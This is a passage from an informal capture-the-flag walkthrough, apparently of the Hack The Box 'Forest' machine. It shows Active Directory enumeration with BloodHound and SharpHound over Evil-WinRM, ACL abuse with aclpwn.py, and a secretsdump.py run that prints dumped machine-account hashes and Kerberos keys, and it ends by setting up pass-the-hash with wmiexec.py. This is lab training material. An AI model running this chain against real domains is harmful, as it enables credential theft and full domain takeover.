...
from here there is something to do with the acl's 
we can download bloodhound and neo4j to be sure 
```
https://gist.github.com/vestjoe/68b579d07f6a685b15d05f55908883cc
```
we will nees sharphound too in order to get the data we need :
```
https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.ps1
```

now we are connected we upload sharphound.ps1 and use it :
```
...
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> invoke-bloodhound
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> download 20200220004128_BloodHound.zip
```
from here we just drop the files into bloodhound to get the graph

now that we are sure the is some acl to bypass we are gonna download -> install -> use aclpwn.py

```
-> aclpwn -f svc-alfresco@htb.local -d HTB.local
	     $user        $IP          $DOMAIN 
...
[+] Saved restore state to aclpwn-20200220-093730.restore
```

now the acl's are good we are in the group who can do everything we can use secretsdump.py from impacket.

```
➜  examples git:(master) ✗ python secretsdump.py htb/svc-alfresco:s3rvice@htb.local
...
FOREST$:1000:aad3b435b51404eeaad3b435b51404ee:842f95a78431ece73ec8eb178de51838:::
...
FOREST$:aes256-cts-hmac-sha1-96:0784a29760d67364504be31ff5083868c2e8e1fffc3d9b5a4181d16e23a4d823
FOREST$:aes128-cts-hmac-sha1-96:d963e4531c14edeaf0ef5eacf15e8b86
FOREST$:des-cbc-md5:9d3d8967515b3d08
EXCH01$:aes256-cts-hmac-sha1-96:1a87f882a1ab851ce15a5e1f48005de99995f2da482837d49f16806099dd85b6
EXCH01$:aes128-cts-hmac-sha1-96:9ceffb340a70b055304c3cd0583edf4e
EXCH01$:des-cbc-md5:8c45f44c16975129
[*] Cleaning up...
``` 
now lets just use the PassTheHash technique with wmiexec.py
```
